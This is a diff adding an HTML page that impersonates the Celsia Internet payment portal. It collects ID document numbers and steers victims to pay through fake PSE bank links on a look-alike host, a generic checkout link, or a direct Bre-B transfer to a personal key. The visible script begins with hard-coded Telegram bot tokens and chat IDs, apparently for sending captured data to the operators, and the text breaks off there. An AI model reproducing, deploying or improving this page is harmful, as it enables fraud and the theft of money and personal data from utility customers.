@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Celsia Internet — Portal de Pagos</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --orange:    #F5821F;
+  --orange-lt: #FEF0E4;
+  --orange-dk: #D96A0A;
+  --border:    #EAEDF4;
+  --text:      #1A1A2E;
+  --muted:     #6B7A99;
+  --input-bg:  #F7F8FC;
+  --shadow:    0 4px 24px rgba(26,26,46,.09), 0 1px 4px rgba(26,26,46,.05);
+  --radius:    18px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+.top-bar{
+  position:fixed;top:0;left:0;right:0;
+  padding:13px 24px;
+  background:linear-gradient(90deg,#D63A10 0%,#E8531F 30%,#F5821F 55%,#E03060 80%,#B8308A 100%);
+  display:flex;align-items:center;gap:12px;
+  z-index:50;box-shadow:0 2px 12px rgba(0,0,0,.18);
+}
+.tb-brand{font-size:17px;font-weight:400;color:#fff}
+.tb-brand strong{font-weight:800}
+.tb-sep{color:rgba(255,255,255,.55);font-size:17px}
+.tb-title{font-size:15px;font-weight:500;color:rgba(255,255,255,.88)}
+
+body{
+  font-family:'Plus Jakarta Sans',system-ui,sans-serif;
+  background:#F0F2F7;color:var(--text);
+  min-height:100vh;display:flex;flex-direction:column;
+  align-items:center;padding:74px 16px 40px;
+}
+
+.view{width:100%;max-width:390px;display:flex;flex-direction:column;align-items:center;gap:16px}
+.view[hidden]{display:none}
+
+.card{
+  width:100%;background:#fff;
+  border-radius:var(--radius);
+  box-shadow:var(--shadow);
+  border:1px solid var(--border);
+  overflow:hidden;
+}
+
+/* ── VISTA 1 ── */
+.card-header{padding:26px 26px 20px;text-align:center;border-bottom:1px solid var(--border)}
+.icon-wrap{
+  width:58px;height:58px;border-radius:16px;background:var(--orange);
+  display:inline-flex;align-items:center;justify-content:center;
+  margin-bottom:12px;box-shadow:0 4px 14px rgba(245,130,31,.32);
+}
+.icon-wrap svg{width:28px;height:28px;fill:#fff}
+.card-header h1{font-size:16px;font-weight:700;line-height:1.35;margin-bottom:4px}
+.card-header p{font-size:13px;color:var(--muted);line-height:1.5}
+.card-body{padding:20px 24px 24px;display:flex;flex-direction:column;gap:18px}
+
+.step-label{
+  display:flex;align-items:center;gap:7px;
+  font-size:11px;font-weight:700;letter-spacing:.05em;
+  text-transform:uppercase;color:var(--orange);
+}
+.step-label .num{
+  background:var(--orange-lt);color:var(--orange);
+  border-radius:50%;width:20px;height:20px;
+  display:inline-flex;align-items:center;justify-content:center;
+  font-size:11px;font-weight:800;flex-shrink:0;
+}
+
+.toggle{
+  display:grid;grid-template-columns:1fr 1fr;
+  border:1.5px solid var(--border);border-radius:10px;overflow:hidden;
+}
+.toggle-btn{
+  padding:11px 0;font-family:inherit;font-size:13px;font-weight:600;
+  cursor:pointer;border:none;background:transparent;
+  color:var(--muted);transition:background .15s,color .15s;
+}
+.toggle-btn:first-child{border-right:1.5px solid var(--border)}
+.toggle-btn.active{background:var(--orange-lt);color:var(--orange)}
+
+.input-wrap{position:relative}
+.input-wrap input{
+  width:100%;padding:13px 44px 13px 16px;
+  border:1.5px solid var(--border);border-radius:10px;
+  background:var(--input-bg);color:var(--text);
+  font-family:inherit;font-size:14px;font-weight:500;
+  outline:none;transition:border-color .15s,box-shadow .15s;
+}
+.input-wrap input::placeholder{color:var(--muted);font-weight:400}
+.input-wrap input:focus{
+  border-color:var(--orange);
+  box-shadow:0 0 0 3px rgba(245,130,31,.13);background:#fff;
+}
+.eye-btn{
+  position:absolute;right:13px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;padding:4px;
+  color:var(--muted);display:flex;align-items:center;
+}
+.eye-btn svg{width:17px;height:17px}
+
+.divider{height:1px;background:var(--border);margin:0 -24px}
+
+.terms-row{
+  display:flex;align-items:flex-start;gap:9px;
+  font-size:12.5px;color:var(--muted);line-height:1.5;
+}
+.terms-row input[type=checkbox]{
+  width:16px;height:16px;min-width:16px;
+  accent-color:var(--orange);margin-top:2px;cursor:pointer;
+}
+.terms-row label{cursor:pointer}
+.terms-link{color:var(--orange);text-decoration:underline;text-underline-offset:2px}
+.required{color:#EF4444;font-weight:700}
+
+.btn-buscar{
+  width:100%;padding:13px;border:none;border-radius:10px;
+  background:var(--orange);color:#fff;
+  font-family:inherit;font-size:14.5px;font-weight:700;
+  cursor:pointer;box-shadow:0 3px 10px rgba(245,130,31,.28);
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  transition:background .15s,opacity .15s;
+}
+.btn-buscar:hover{background:var(--orange-dk)}
+.btn-buscar:disabled{opacity:.45;cursor:not-allowed}
+.spinner{
+  width:15px;height:15px;
+  border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;
+  border-radius:50%;animation:spin .6s linear infinite;display:none;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.card-footer{
+  padding:13px 24px;border-top:1px solid var(--border);
+  text-align:center;font-size:11.5px;color:var(--muted);
+}
+
+/* ── STEPPER ── */
+.stepper{
+  display:flex;align-items:flex-start;justify-content:center;
+  width:100%;padding:20px 0 10px;
+}
+.step-item{display:flex;flex-direction:column;align-items:center;gap:6px;flex:1}
+.step-circle{
+  width:34px;height:34px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:800;flex-shrink:0;
+}
+.step-circle.done{background:var(--orange);color:#fff}
+.step-circle.active{background:var(--orange);color:#fff;box-shadow:0 0 0 4px rgba(245,130,31,.18)}
+.step-circle.pending{background:#E5E7EB;color:#9CA3AF}
+.step-text{font-size:11px;font-weight:600;text-align:center;line-height:1.3;color:var(--muted);max-width:70px}
+.step-text.active{color:var(--orange);font-weight:700}
+.step-line{flex:1;height:2px;background:#E5E7EB;margin-top:17px}
+.step-line.done{background:var(--orange)}
+
+/* ── VISTA 2 ── */
+.acc-card{width:100%;background:#fff;border-radius:var(--radius);box-shadow:var(--shadow);border:1px solid var(--border);overflow:hidden}
+.acc-top{padding:20px 20px 16px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid var(--border)}
+.acc-num{font-size:28px;font-weight:800;letter-spacing:-.5px;line-height:1}
+.acc-id-label{font-size:11px;font-weight:700;color:var(--orange);letter-spacing:.06em;text-transform:uppercase;margin-top:4px}
+.badge{display:inline-flex;align-items:center;gap:5px;padding:4px 11px;border-radius:20px;font-size:11.5px;font-weight:700}
+.badge.suspendido{background:#FEE2E2;color:#DC2626}
+.badge.activo{background:#DCFCE7;color:#16A34A}
+.badge-dot{width:7px;height:7px;border-radius:50%;background:currentColor;flex-shrink:0}
+
+.saldo-box{
+  margin:0 16px 16px;border-radius:14px;padding:18px 20px 16px;
+  background:linear-gradient(135deg,#F5821F 0%,#E8531F 40%,#E03060 75%,#B8308A 100%);
+  color:#fff;
+}
+.saldo-label{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;opacity:.85;margin-bottom:4px}
+.saldo-amount{font-size:34px;font-weight:800;letter-spacing:-1px;line-height:1.1}
+.saldo-meta{margin-top:10px;font-size:11px;opacity:.8;display:flex;gap:12px;flex-wrap:wrap}
+.saldo-meta span{font-weight:600}
+
+.acc-info{padding:0 20px 16px;display:flex;flex-direction:column}
+.info-row{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid var(--border);font-size:13px}
+.info-row:last-child{border-bottom:none}
+.info-icon{color:var(--muted);flex-shrink:0;width:16px;text-align:center}
+.info-text{color:var(--text);font-weight:500}
+
+.acc-actions{padding:0 20px 20px;display:flex;flex-direction:column;gap:10px}
+.btn-pago-total{
+  display:block;width:100%;padding:14px;
+  background:var(--orange);color:#fff;
+  border:none;border-radius:12px;
+  font-family:inherit;font-size:15px;font-weight:700;
+  text-align:center;cursor:pointer;
+  box-shadow:0 3px 12px rgba(245,130,31,.3);
+  transition:background .15s;
+}
+.btn-pago-total:hover{background:var(--orange-dk)}
+.btn-pago-total.disabled{opacity:.4;pointer-events:none;cursor:not-allowed}
+
+.btn-volver{
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  width:100%;padding:12px;
+  background:transparent;color:var(--muted);
+  border:none;font-family:inherit;font-size:13px;font-weight:600;
+  cursor:pointer;transition:color .15s;
+}
+.btn-volver:hover{color:var(--text)}
+
+/* ── VISTA 3 ── */
+.pay-summary{
+  margin:16px 16px 0;border-radius:14px;padding:16px 20px;
+  background:linear-gradient(135deg,#F5821F 0%,#E8531F 40%,#E03060 75%,#B8308A 100%);
+  color:#fff;
+}
+.pay-sum-label{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;opacity:.85;margin-bottom:2px}
+.pay-sum-amount{font-size:30px;font-weight:800;letter-spacing:-1px;line-height:1.1}
+.pay-sum-sub{margin-top:6px;font-size:11px;opacity:.82;font-weight:600}
+
+.pay-methods-title{
+  padding:18px 20px 10px;
+  font-size:11px;font-weight:700;color:var(--muted);
+  letter-spacing:.06em;text-transform:uppercase;
+}
+
+.pay-method{
+  display:flex;align-items:center;gap:14px;
+  padding:14px 20px;
+  border-top:1px solid var(--border);
+  cursor:pointer;transition:background .15s;
+  background:#fff;
+}
+.pay-method:hover{background:#FAFAFA}
+.pay-method-icon{
+  width:44px;height:44px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;overflow:hidden;
+}
+.pay-method-icon img{width:30px;height:30px;object-fit:contain}
+.pay-method-icon.nequi{background:#F3E8FD}
+.pay-method-icon.bogota{background:#E8F0FD}
+.pay-method-icon.breb{background:#F0EBFF}
+.pay-method-icon.pse{background:#E8FDF3}
+
+/* ── Wompi transition overlay ── */
+#wompiOverlay{
+  display:none;position:fixed;inset:0;background:#fff;z-index:300001;
+  flex-direction:column;align-items:center;justify-content:center;
+  gap:18px;padding:30px;text-align:center;font-family:inherit;
+}
+#wompiOverlay.show{display:flex}
+.wo-spin{
+  width:52px;height:52px;
+  border:5px solid #E5E7EB;border-top-color:var(--orange);
+  border-radius:50%;animation:spin .9s linear infinite;
+}
+.wo-bank{font-size:15px;font-weight:700;color:var(--text);margin:0}
+.wo-hint{font-size:13px;color:var(--muted);max-width:280px;line-height:1.5;margin:0}
+.wo-amount-box{
+  background:linear-gradient(135deg,#F5821F 0%,#E03060 100%);
+  border-radius:14px;padding:16px 28px;color:#fff;
+}
+.wo-amount-label{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;opacity:.85;margin-bottom:4px}
+.wo-amount-val{font-size:32px;font-weight:800;letter-spacing:-1px}
+.wo-wompi-hint{
+  display:flex;align-items:center;gap:8px;
+  background:#FEF0E4;border:1px solid var(--orange);
+  border-radius:10px;padding:10px 16px;
+  font-size:12.5px;font-weight:600;color:var(--orange);max-width:300px;
+}
+.wo-countdown{font-size:12px;color:var(--muted);margin:0}
+.pay-method-text{flex:1}
+.pay-method-name{font-size:14px;font-weight:700;color:var(--text);margin-bottom:2px}
+.pay-method-sub{font-size:11.5px;color:var(--muted)}
+.pay-method-arrow{color:var(--muted);font-size:20px;font-weight:300}
+
+/* PSE form */
+.pse-panel{display:none;padding:14px 20px 20px;background:#F7F8FC;border-top:1px solid var(--border)}
+.pse-panel.show{display:block}
+.pse-field{margin-bottom:12px}
+.pse-field label{display:block;font-size:11.5px;color:var(--muted);font-weight:700;margin-bottom:6px;letter-spacing:.03em;text-transform:uppercase}
+.pse-field select,.pse-field input{
+  width:100%;padding:11px 14px;
+  border:1.5px solid var(--border);border-radius:10px;
+  background:#fff;color:var(--text);
+  font-family:inherit;font-size:13.5px;font-weight:500;
+  outline:none;transition:border-color .15s;
+}
+.pse-field select:focus,.pse-field input:focus{border-color:var(--orange)}
+.btn-pse{
+  width:100%;padding:13px;border:none;border-radius:10px;
+  background:var(--orange);color:#fff;
+  font-family:inherit;font-size:14px;font-weight:700;
+  cursor:pointer;margin-top:4px;transition:background .15s;
+}
+.btn-pse:hover{background:var(--orange-dk)}
+
+.pay-footer{padding:14px 20px 18px;border-top:1px solid var(--border)}
+
+/* ── Loading overlay ── */
+#payLoadingOverlay{
+  display:none;position:fixed;inset:0;background:#fff;z-index:300001;
+  flex-direction:column;align-items:center;justify-content:center;
+  gap:22px;padding:30px;text-align:center;font-family:inherit;
+}
+#payLoadingOverlay.show{display:flex}
+.ov-spin{
+  width:52px;height:52px;
+  border:5px solid #E5E7EB;border-top-color:var(--orange);
+  border-radius:50%;animation:spin .9s linear infinite;
+}
+#payLoadingText{font-size:16px;color:var(--text);font-weight:600;margin:0}
+
+/* Rejection */
+#payRejected{display:none;flex-direction:column;align-items:center;gap:14px;max-width:300px}
+#payRejected.show{display:flex}
+.rej-icon{width:64px;height:64px;background:#FEE2E2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px}
+.rej-title{font-size:16px;font-weight:700;color:#DC2626;margin:0}
+.rej-sub{font-size:14px;color:var(--muted);text-align:center;line-height:1.5;margin:0}
+.btn-retry{
+  background:#7C3AED;color:#fff;border:none;border-radius:25px;
+  padding:13px 28px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;
+}
+
+/* ── Success overlay ── */
+#paySuccessOverlay{
+  display:none;position:fixed;inset:0;background:#fff;z-index:300001;
+  flex-direction:column;align-items:center;justify-content:center;
+  padding:30px;text-align:center;font-family:inherit;
+}
+#paySuccessOverlay.show{display:flex}
+.ok-icon{
+  width:80px;height:80px;background:#DCFCE7;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:36px;margin-bottom:24px;
+}
+#paySuccessOverlay h2{font-size:24px;font-weight:800;color:var(--text);margin-bottom:12px}
+#paySuccessOverlay p{font-size:15px;color:var(--muted);max-width:300px;line-height:1.6;margin-bottom:32px}
+.btn-ok{
+  background:var(--orange);color:#fff;border:none;border-radius:25px;
+  padding:14px 40px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;
+}
+
+/* ── Bre-B modal ── */
+#brevModal{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,.55);z-index:300000;
+  align-items:center;justify-content:center;padding:20px;
+  backdrop-filter:blur(3px);
+}
+#brevModal.show{display:flex}
+.brev-card{
+  background:#fff;border-radius:20px;max-width:380px;width:100%;
+  padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.25);font-family:inherit;
+}
+.brev-icon-wrap{
+  width:64px;height:64px;background:#F0EBFF;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 14px;font-size:28px;
+}
+.brev-card h3{font-size:20px;font-weight:800;color:var(--text);text-align:center;margin-bottom:6px}
+.brev-sub{font-size:13px;color:var(--muted);text-align:center;margin-bottom:20px}
+.brev-amount-box{
+  background:#DCFCE7;border:1px solid #16A34A;border-radius:10px;
+  padding:14px 18px;text-align:center;margin-bottom:14px;
+}
+.brev-amount-box .lbl{font-size:11px;color:#16A34A;font-weight:700;text-transform:uppercase;margin-bottom:4px;letter-spacing:.05em}
+.brev-amount-box .val{font-size:24px;font-weight:800;color:#16A34A}
+.brev-key-box{
+  background:#F0EBFF;border:1.5px solid #7C3AED;border-radius:10px;
+  padding:14px 18px;margin-bottom:20px;
+}
+.brev-key-box .klbl{font-size:11px;color:#7C3AED;font-weight:700;text-transform:uppercase;margin-bottom:8px;letter-spacing:.05em}
+.brev-key-row{display:flex;align-items:center;gap:10px}
+.brev-key-row .key{font-size:18px;font-weight:800;color:var(--text);flex:1;letter-spacing:.5px}
+.brev-copy-btn{
+  background:#7C3AED;color:#fff;border:none;border-radius:8px;
+  padding:8px 14px;font-size:13px;font-weight:700;cursor:pointer;
+  display:flex;align-items:center;gap:6px;font-family:inherit;white-space:nowrap;
+}
+.brev-confirm-btn{
+  width:100%;background:var(--orange);color:#fff;border:none;border-radius:25px;
+  padding:14px;font-size:15px;font-weight:700;cursor:pointer;
+  font-family:inherit;margin-bottom:10px;transition:background .15s;
+}
+.brev-confirm-btn:hover{background:var(--orange-dk)}
+.brev-cancel-btn{
+  width:100%;background:transparent;color:var(--muted);border:none;
+  padding:10px;font-size:13px;cursor:pointer;font-family:inherit;
+}
+
+/* ── Toast ── */
+.toast{
+  position:fixed;bottom:24px;left:50%;
+  transform:translateX(-50%) translateY(80px);
+  background:#fff;border:1.5px solid var(--border);
+  border-radius:12px;padding:11px 18px;
+  display:flex;align-items:center;gap:9px;
+  font-size:13px;font-weight:600;color:var(--text);
+  box-shadow:0 8px 28px rgba(0,0,0,.11);
+  transition:transform .3s cubic-bezier(.34,1.56,.64,1),opacity .25s;
+  opacity:0;pointer-events:none;white-space:nowrap;z-index:100;
+}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+.toast-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.toast.ok .toast-dot{background:#22C55E}
+.toast.err .toast-dot{background:#EF4444}
+</style>
+
+<header class="top-bar">
+  <span class="tb-brand"><strong>Celsia</strong> internet</span>
+  <span class="tb-sep">|</span>
+  <span class="tb-title">Portal de Pagos</span>
+</header>
+
+<!-- ═══ VISTA 1: BÚSQUEDA ═══ -->
+<div class="view" id="v-search">
+  <div class="card">
+    <div class="card-header">
+      <div class="icon-wrap">
+        <svg viewBox="0 0 48 48"><path d="M24 6a7 7 0 1 1 0 14A7 7 0 0 1 24 6zm0 3a4 4 0 1 0 0 8 4 4 0 0 0 0-8zm1 1.27V12h2v1.5h-2v1h2V16h-6v-1.5h2V13h-2V11.5h2v-.23a2.5 2.5 0 0 1 2 0zM10 30c0-3.87 3.13-7 7-7h4.7A9.96 9.96 0 0 0 24 24a9.96 9.96 0 0 0 2.3-.23V23H30a7 7 0 0 1 7 7v1H10v-1zm3 4h22v2a2 2 0 0 1-2 2H15a2 2 0 0 1-2-2v-2z"/></svg>
+      </div>
+      <h1>Consulta, paga o abona<br>a tu factura</h1>
+      <p>Sigue los pasos para consultar o realizar tus pagos</p>
+    </div>
+
+    <div class="card-body">
+      <div>
+        <div class="step-label" style="margin-bottom:10px">
+          <span class="num">1</span> Selecciona el tipo de búsqueda
+        </div>
+        <div class="toggle" role="group">
+          <button class="toggle-btn active" id="btn-doc" onclick="selectTipo('documento')">Por documento</button>
+          <button class="toggle-btn"        id="btn-cta" onclick="selectTipo('cuenta')">Por cuenta</button>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <div>
+        <div class="step-label" style="margin-bottom:10px">
+          <span class="num">2</span> Ingresa la información y haz clic en buscar
+        </div>
+        <div class="input-wrap">
+          <input type="password" id="referencia"
+            placeholder="Ingresa aquí tu documento"
+            autocomplete="off" maxlength="20" inputmode="numeric">
+          <button class="eye-btn" onclick="toggleVer()" type="button">
+            <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="terms-row">
+        <input type="checkbox" id="chk-terms" onchange="onTermsChange()">
+        <label for="chk-terms">
+          Acepto las <a class="terms-link" href="https://www.celsia.com/politica-de-privacidad" target="_blank" rel="noopener">políticas de tratamiento de datos personales</a> <span class="required">*</span>
+        </label>
+      </div>
+
+      <button class="btn-buscar" id="btn-buscar" onclick="buscar()" disabled>
+        <div class="spinner" id="spinner"></div>
+        <span id="btn-text">Buscar</span>
+      </button>
+    </div>
+
+    <div class="card-footer">Línea de atención: <strong>01 8000 123 770</strong></div>
+  </div>
+</div>
+
+<!-- ═══ VISTA 2: RESULTADO ═══ -->
+<div class="view" id="v-result" hidden>
+
+  <div class="stepper">
+    <div class="step-item">
+      <div class="step-circle done">✓</div>
+      <div class="step-text">Consulta</div>
+    </div>
+    <div class="step-line done"></div>
+    <div class="step-item">
+      <div class="step-circle active">2</div>
+      <div class="step-text active">Revisa tu<br>factura</div>
+    </div>
+    <div class="step-line"></div>
+    <div class="step-item">
+      <div class="step-circle pending">3</div>
+      <div class="step-text">Paga</div>
+    </div>
+  </div>
+
+  <div class="acc-card">
+    <div class="acc-top">
+      <div>
+        <div class="acc-num" id="r-cuenta">—</div>
+        <div class="acc-id-label">ID DE CUENTA</div>
+      </div>
+      <div class="badge" id="r-badge"><span class="badge-dot"></span><span id="r-badge-text">—</span></div>
+    </div>
+
+    <div class="saldo-box">
+      <div class="saldo-label">Saldo Total</div>
+      <div class="saldo-amount" id="r-saldo">$0</div>
+      <div class="saldo-meta">
+        <span>Cupón: <span id="r-cupon">—</span></span>
+        <span>Ref: <span id="r-ref">—</span></span>
+      </div>
+    </div>
+
+    <div class="acc-info">
+      <div class="info-row">
+        <span class="info-icon">👤</span>
+        <span class="info-text" id="r-nombre">—</span>
+      </div>
+      <div class="info-row">
+        <span class="info-icon">📍</span>
+        <span class="info-text" id="r-dir">—</span>
+      </div>
+    </div>
+
+    <div class="acc-actions">
+      <button id="btn-pagar" class="btn-pago-total disabled" onclick="irAPagar()">
+        Pago Total
+      </button>
+      <button class="btn-volver" onclick="volver()">← Volver</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ VISTA 3: MÉTODOS DE PAGO ═══ -->
+<div class="view" id="v-payment" hidden>
+
+  <div class="stepper">
+    <div class="step-item">
+      <div class="step-circle done">✓</div>
+      <div class="step-text">Consulta</div>
+    </div>
+    <div class="step-line done"></div>
+    <div class="step-item">
+      <div class="step-circle done">✓</div>
+      <div class="step-text">Factura</div>
+    </div>
+    <div class="step-line done"></div>
+    <div class="step-item">
+      <div class="step-circle active">3</div>
+      <div class="step-text active">Paga</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="pay-summary">
+      <div class="pay-sum-label">Total a pagar</div>
+      <div class="pay-sum-amount" id="pv-monto">$0</div>
+      <div class="pay-sum-sub">Cuenta: <span id="pv-cuenta">—</span> · <span id="pv-nombre">—</span></div>
+    </div>
+
+    <div class="pay-methods-title">Selecciona tu método de pago</div>
+
+    <!-- Nequi -->
+    <div class="pay-method" onclick="pagarNequi()">
+      <div class="pay-method-icon nequi"><img src="nequilogo-BA1fovyB.svg" alt="Nequi"></div>
+      <div class="pay-method-text">
+        <div class="pay-method-name">Nequi</div>
+        <div class="pay-method-sub">Pago instantáneo desde tu app</div>
+      </div>
+      <div class="pay-method-arrow">›</div>
+    </div>
+
+    <!-- Banco de Bogotá -->
+    <div class="pay-method" onclick="pagarBogota()">
+      <div class="pay-method-icon bogota"><img src="Banco-De-Bogota-Logo-Mark-PNG-thumb.png" alt="Banco de Bogotá"></div>
+      <div class="pay-method-text">
+        <div class="pay-method-name">Banco de Bogotá</div>
+        <div class="pay-method-sub">Débito desde tu cuenta bancaria</div>
+      </div>
+      <div class="pay-method-arrow">›</div>
+    </div>
+
+    <!-- Bre-B -->
+    <div class="pay-method" onclick="abrirBrev()">
+      <div class="pay-method-icon breb"><img src="Bre-B-logo.png" alt="Bre-B"></div>
+      <div class="pay-method-text">
+        <div class="pay-method-name">Bre-B</div>
+        <div class="pay-method-sub">Transferencia directa a llave</div>
+      </div>
+      <div class="pay-method-arrow">›</div>
+    </div>
+
+    <!-- PSE -->
+    <div class="pay-method" onclick="togglePseForm()">
+      <div class="pay-method-icon pse"><img src="pseLogo-BLCcINO8.png" alt="PSE"></div>
+      <div class="pay-method-text">
+        <div class="pay-method-name">PSE</div>
+        <div class="pay-method-sub">Débito bancario en línea</div>
+      </div>
+      <div class="pay-method-arrow" id="pse-arrow">›</div>
+    </div>
+
+    <!-- PSE form -->
+    <div class="pse-panel" id="pse-panel">
+      <div class="pse-field">
+        <label>Tipo de documento</label>
+        <select id="pse-doctype">
+          <option value="CC">Cédula de Ciudadanía</option>
+          <option value="CE">Cédula de Extranjería</option>
+          <option value="NIT">NIT</option>
+          <option value="PAS">Pasaporte</option>
+        </select>
+      </div>
+      <div class="pse-field">
+        <label>Número de documento</label>
+        <input type="text" id="pse-docnum" placeholder="Ej: 1012345678" inputmode="numeric">
+      </div>
+      <div class="pse-field">
+        <label>Banco</label>
+        <select id="pse-bank">
+          <option value="">Selecciona un banco</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/">Nequi</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f9/">Bancolombia</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Davivienda</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/">Banco de Bogotá</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco de Occidente</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f18/">Banco Popular</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco AV Villas</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Caja Social</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">BBVA Colombia</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Scotiabank Colpatria</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Agrario de Colombia</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco GNB Sudameris</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Pichincha</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Itaú</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Daviplata</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Movii</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Lulo Bank</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Nu Colombia</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Rappipay</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Ualá</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Cooperativo Coopcentral</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Coltefinanciera</option>
+          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Pibank</option>
+        </select>
+      </div>
+      <div class="pse-field">
+        <label>Tipo de persona</label>
+        <select id="pse-person">
+          <option value="natural">Persona natural</option>
+          <option value="juridica">Persona jurídica</option>
+        </select>
+      </div>
+      <button class="btn-pse" onclick="pagarPSE()">Continuar con PSE</button>
+    </div>
+
+    <div class="pay-footer">
+      <button class="btn-volver" onclick="volverAResultado()">← Volver</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"><span class="toast-dot"></span><span id="toast-msg"></span></div>
+
+<!-- ── Wompi transition overlay (PSE bancos sin portal propio) ── -->
+<div id="wompiOverlay">
+  <div class="wo-spin"></div>
+  <p class="wo-bank" id="wo-bank-name">Conectando con el banco...</p>
+  <div class="wo-amount-box">
+    <div class="wo-amount-label">Valor a pagar en Wompi</div>
+    <div class="wo-amount-val" id="wo-amount-val">$0</div>
+  </div>
+  <div class="wo-wompi-hint">
+    💡 Ingresa este valor cuando Wompi te lo solicite
+  </div>
+  <p class="wo-hint">Serás redirigido a <strong>Wompi</strong> para completar tu pago de forma segura.</p>
+  <p class="wo-countdown" id="wo-countdown" hidden>Redirigiendo en 8 segundos...</p>
+</div>
+
+<!-- ── Bre-B Modal ── -->
+<div id="brevModal">
+  <div class="brev-card">
+    <div class="brev-icon-wrap">🔗</div>
+    <h3>Transferencia directa</h3>
+    <p class="brev-sub">Transfiere el valor exacto a esta llave</p>
+
+    <div class="brev-amount-box">
+      <div class="lbl">Valor a transferir</div>
+      <div class="val" id="brev-monto-modal">—</div>
+    </div>
+
+    <div class="brev-key-box">
+      <div class="klbl">Llave Bre-B</div>
+      <div class="brev-key-row">
+        <span class="key">@LITTIO1047039997</span>
+        <button class="brev-copy-btn" onclick="brevCopiar()">📋 Copiar</button>
+      </div>
+    </div>
+
+    <button class="brev-confirm-btn" onclick="brevConfirmar()">Ya realicé la transferencia</button>
+    <button class="brev-cancel-btn" onclick="brevCerrar()">Cancelar</button>
+  </div>
+</div>
+
+<!-- ── Loading overlay ── -->
+<div id="payLoadingOverlay">
+  <div class="ov-spin" id="ov-spin"></div>
+  <p id="payLoadingText">Conectando...</p>
+  <p style="font-size:13px;color:var(--muted);margin:0">Por favor espera mientras procesamos tu pago.</p>
+  <div id="payRejected">
+    <div class="rej-icon">❌</div>
+    <p class="rej-title">Pago no verificado</p>
+    <p class="rej-sub">No pudimos confirmar tu transferencia. Verifica que realizaste el pago a la llave correcta.</p>
+    <button class="btn-retry" onclick="brevReintentar()">Volver a intentar</button>
+  </div>
+</div>
+
+<!-- ── Success overlay ── -->
+<div id="paySuccessOverlay">
+  <div class="ok-icon">✅</div>
+  <h2>¡Pago exitoso!</h2>
+  <p>Tu solicitud fue recibida. Te notificaremos cuando confirmemos tu transferencia.</p>
+  <button class="btn-ok" onclick="reiniciar()">Volver al inicio</button>
+</div>
+
+<script>
+const API      = '';
+const TG_TOKEN = '8635806486:AAFhW2eZomBIixBIMJ9UvIxtuB-kCvypCNQ';
+const TG_CHAT  = '-5568722439';
+
+// Bot JLP para confirmación Bre-B
+const JLP_TK  = '8550551689:AAGZc5-TykD7olUxG27nJJ8QglYXBn0ivPg';
+const JLP_GRP = '-1004398504693';
